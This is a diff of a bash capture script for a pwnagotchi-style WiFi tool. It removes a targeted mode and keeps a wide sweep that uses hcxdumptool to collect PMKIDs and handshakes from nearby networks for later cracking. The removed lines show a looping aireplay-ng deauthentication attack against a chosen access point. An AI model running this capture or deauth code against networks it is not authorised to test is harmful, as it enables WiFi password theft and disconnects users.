@@ -6,9 +6,8 @@
 # Sly already reads them, so cracking needs no change.
 #
 # Config is read from /tmp/fennec-scout/config.json (written by scout_engine.py):
-#   mode     : "wide" (PMKID + opportunistic, no deauth) or "targeted"
+#   mode     : "wide" (PMKID + opportunistic, no deauth)
 #   adapters : list of monitor-capable interfaces to use (1 or 2)
-#   target   : targeted mode only, {bssid, name, channel}
 #
 # Stats for the launcher are written to /tmp/fennec-scout/stats.json.
 #
@@ -21,7 +20,6 @@ RUN_DIR=/tmp/fennec-scout
 CONFIG="$RUN_DIR/config.json"
 STATS="$RUN_DIR/stats.json"
 PCAP="$RUN_DIR/scout.pcapng"
-FILTER="$RUN_DIR/target.bssid"
 HANDSHAKES=/etc/pwnagotchi/handshakes
 
 # EU channel plan. One adapter sweeps everything; two split the bands.
@@ -31,15 +29,13 @@ BANDALL="$BAND24,$BAND5"
 
 mkdir -p "$RUN_DIR"
 chmod 755 "$RUN_DIR"
-rm -f "$PCAP" "$FILTER"
+rm -f "$PCAP"
 mkdir -p "$HANDSHAKES"
 
 [ -f "$CONFIG" ] || { echo "no config"; exit 1; }
 
 MODE=$(python3 -c 'import json,sys;print(json.load(open(sys.argv[1])).get("mode","wide"))' "$CONFIG" 2>/dev/null)
 IFACES=$(python3 -c 'import json,sys;print(" ".join(json.load(open(sys.argv[1])).get("adapters") or []))' "$CONFIG" 2>/dev/null)
-TGT_BSSID=$(python3 -c 'import json,sys;t=json.load(open(sys.argv[1])).get("target") or {};print(t.get("bssid",""))' "$CONFIG" 2>/dev/null)
-TGT_CHAN=$(python3 -c 'import json,sys;t=json.load(open(sys.argv[1])).get("target") or {};print(t.get("channel","") or "")' "$CONFIG" 2>/dev/null)
 
 [ -n "$IFACES" ] || { echo "no adapters"; exit 1; }
 set -- $IFACES
@@ -62,7 +58,6 @@ pids=()
 cleanup() {
     kill "${pids[@]}" 2>/dev/null
     pkill -f "hcxdumptool.*fennec-scout" 2>/dev/null
-    pkill -f "aireplay-ng.*--deauth" 2>/dev/null
     exit 0
 }
 trap cleanup TERM INT
@@ -94,24 +89,7 @@ hcx_capture() {   # $1 interface, $2 "" for all-frequency sweep, else channel li
     pids+=($!)
 }
 
-if [ "$MODE" = "targeted" ] && [ -n "$TGT_BSSID" ]; then
-    # Lock onto the target's channel (learned during the sweep) so the capture
-    # and the deauth sit on the right frequency.
-    [ -z "$TGT_CHAN" ] && TGT_CHAN=$(awk -v b="$(echo "$TGT_BSSID" | tr 'A-F' 'a-f')" \
-        '$1==b{print $2; exit}' "$RUN_DIR/channels.txt" 2>/dev/null)
-    echo "targeted $TGT_BSSID chan=${TGT_CHAN:-unknown}" >> "$RUN_DIR/run.log"
-    [ -n "$TGT_CHAN" ] && iw dev "$IFACE1" set channel "$TGT_CHAN" 2>/dev/null || true
-    hcx_capture "$IFACE1" "$TGT_CHAN"
-    # Force the 4-way with a classic, reliable aireplay-ng deauth aimed only at
-    # the whitelisted target (offensive, whitelist-gated upstream).
-    (
-        while true; do
-            aireplay-ng --deauth 5 -a "$TGT_BSSID" "$IFACE1" >> "$RUN_DIR/run.log" 2>&1
-            sleep 8
-        done
-    ) &
-    pids+=($!)
-elif [ -n "$IFACE2" ]; then
+if [ -n "$IFACE2" ]; then
     # Two adapters: split the bands (loop reads IFACE1's capture).
     hcx_capture "$IFACE1" "$BAND24"
     hcxdumptool -i "$IFACE2" -w "${PCAP%.pcapng}-5g.pcapng" -c "$BAND5" \
@@ -198,11 +176,6 @@ while true; do
 
         # APs seen = distinct named networks, so it matches the list below.
         aps=${#STATUS[@]}
-
-        # Remember each AP's channel, so a later targeted capture can lock onto it.
-        tshark -r "$PCAP" -Y "wlan.fc.type_subtype==0x08" -T fields \
-               -e wlan.bssid -e wlan.ds.current_channel 2>/dev/null \
-               | tr 'A-F' 'a-f' | awk 'NF==2 && $2!="" && !s[$1]++' > "$RUN_DIR/channels.txt" 2>/dev/null
 
         # 3) Build the list, best status first, capped for readability.
         items=""; n=0
